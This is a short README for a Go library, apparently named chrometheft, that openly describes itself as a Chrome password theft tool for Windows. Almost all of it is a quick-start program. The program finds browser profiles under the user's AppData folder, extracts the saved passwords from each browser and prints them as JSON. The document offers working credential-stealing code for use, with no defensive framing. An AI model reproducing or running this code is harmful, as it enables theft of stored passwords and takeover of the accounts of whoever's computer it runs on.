# chrometheft
Flexible Chrome password theft for Windows

# Usage
## Quick start
~~~go
package main

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/liulihaocai/chrometheft"
)

func main() {
	browsers, err := chrometheft.DetectBrowsers(os.Getenv("USERPROFILE") + "\\AppData\\Local")
	if err != nil {
		panic(err)
	}
	for _, browser := range browsers {
		fmt.Println("Browser:", browser)
		passwords, err := chrometheft.GetPasswords(browser)
		if err != nil {
			fmt.Println("Error:", err)
		}
		for _, password := range passwords {
			pwd, _ := json.Marshal(password)
			fmt.Println(string(pwd))
		}
	}
}
~~~
